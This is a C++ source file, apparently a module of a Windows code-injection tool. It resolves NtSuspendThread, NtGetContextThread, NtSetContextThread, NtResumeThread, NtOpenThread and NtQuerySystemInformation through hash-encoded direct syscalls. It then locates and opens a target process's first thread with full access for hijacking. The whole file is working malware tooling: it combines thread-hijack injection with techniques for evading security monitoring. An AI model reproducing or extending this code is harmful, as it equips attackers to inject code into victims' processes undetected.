#include "apc.hpp"


apc apcInjector;


VOID apc::mySuspendThread(HANDLE thread) {
        ULONG previoussuspensionCount;
        syscallHandling::SYSCALL_DATA structNtSuspendThread = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 2515773330);
        wsysSuspendThread = structNtSuspendThread.syscallAddress;
        //std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
        ssnsysSuspendThread = structNtSuspendThread.ssn;

        NTSTATUS status = sysSuspendThread(thread, &previoussuspensionCount);

    }
VOID apc::myThreadContext(HANDLE thread, PCONTEXT context) {

        syscallHandling::SYSCALL_DATA structNtGetContextThread = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 2651724356);
        wsysNtGetContextThread = structNtGetContextThread.syscallAddress;
        //std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
        ssnsysNtGetContextThread = structNtGetContextThread.ssn;

        NTSTATUS status = sysNtGetContextThread(thread, context);


    }
VOID apc::myNtSetContextThread(HANDLE thread, PCONTEXT context) {

        syscallHandling::SYSCALL_DATA structmyNtSetContextThread = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 814473424);
        wsysNtSetContextThread = structmyNtSetContextThread.syscallAddress;
        //std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
        ssnsysNtSetContextThread = structmyNtSetContextThread.ssn;

        NTSTATUS status = sysNtSetContextThread(thread, context);

    }
VOID apc::myNtResumeThread(HANDLE thread) {

        syscallHandling::SYSCALL_DATA structmyNtResumeThread = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 746274096);
        wsysNtResumeThread = structmyNtResumeThread.syscallAddress;

        ssnsysNtResumeThread = structmyNtResumeThread.ssn;
        ULONG previousThreadState;
        NTSTATUS status = sysNtResumeThread(thread, &previousThreadState);

    }
HANDLE apc::myNtOpenThread(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD target_tId, DWORD process_id) {

        HANDLE hThread = NULL;
        OBJECT_ATTRIBUTES oa;
        CLIENT_ID cid;

        // Initialize Object Attributes (usually all NULL for a simple thread open)
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

        cid.UniqueProcess = (HANDLE)(ULONG_PTR)process_id; // The PID of the target
        cid.UniqueThread = (HANDLE)(ULONG_PTR)target_tId;
        syscallHandling::SYSCALL_DATA structmyNtOpenThread = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 4220137937);
        wsysNtOpenThread = structmyNtOpenThread.syscallAddress;
        ssnsysNtOpenThread = structmyNtOpenThread.ssn;

        NTSTATUS status = sysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, cid);

        return hThread;
    }
HANDLE apc::findThread(DWORD process_pid) {
        // 1. Setup Syscall for NtQuerySystemInformation
        syscallHandling::SYSCALL_DATA data = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3998184360);
        wsysNtQuerySystemInformation = data.syscallAddress;
        ssnsysNtQuerySystemInformation = data.ssn;

        ULONG bufferSize = 0;
        // Get required size
        sysNtQuerySystemInformation(5, NULL, 0, &bufferSize);

        bufferSize += 0x10000;
        PVOID buffer = mainInjector.vAlloc((HANDLE)-1, NULL, (SIZE_T)bufferSize);
        if (!buffer) return NULL;

        if (sysNtQuerySystemInformation(5, buffer, bufferSize, NULL) == 0) {
            PSYSTEM_PROCESS_INFORMATION pProcInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;

            while (true) {
                // Check PID (Cast UniqueProcessId handle to DWORD)
                if ((DWORD)(ULONG_PTR)pProcInfo->UniqueProcessId == process_pid) {
                    //std::cout << "found pid: " << (DWORD)(ULONG_PTR)pProcInfo->UniqueProcessId << "\n";
                    if (pProcInfo->NumberOfThreads > 0) {
                        // Threads start exactly after the Process Info structure
                        PSYSTEM_THREAD_INFORMATION pThreads = (PSYSTEM_THREAD_INFORMATION)((PBYTE)pProcInfo + sizeof(SYSTEM_PROCESS_INFORMATION));

                        // Use the first thread for hijacking
                        DWORD targetTid = (DWORD)(ULONG_PTR)pThreads[0].ClientId.UniqueThread;
                        //std::cout << "found tID : " << targetTid << "\n";                    // Open the thread
                        HANDLE hThread = myNtOpenThread(THREAD_ALL_ACCESS, FALSE, targetTid, process_pid);
                        //std::cout << "got handle : " << hThread << "\n";
                        // Clean up buffer before returning
                        mainInjector.vFree(buffer, 0);
                        //std::cout << "Freeded buffer ";
                        return hThread;
                    }
                }

                if (pProcInfo->NextEntryOffset == 0) break;
                // Move to next entry using the offset
                pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
            }
        }

        mainInjector.vFree(buffer, 0);
        return NULL;
    }

